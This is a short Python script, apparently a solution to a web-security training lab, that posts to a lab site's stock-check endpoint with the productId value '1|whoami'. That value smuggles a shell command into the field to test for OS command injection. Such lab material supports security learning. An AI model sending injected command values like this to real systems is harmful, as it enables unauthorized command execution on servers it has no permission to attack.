import requests

site = 'ac2e1fda1f9856a4c0316d6e004100e4.web-security-academy.net'

s = requests.Session()

url = f'''https://{site}'''
stock_post_url = f'''{url}/product/stock'''


post_data = {
    'productId' : '1|whoami',
    'storeId' : '1'
}

resp = s.post(stock_post_url, data=post_data)
print(resp.text)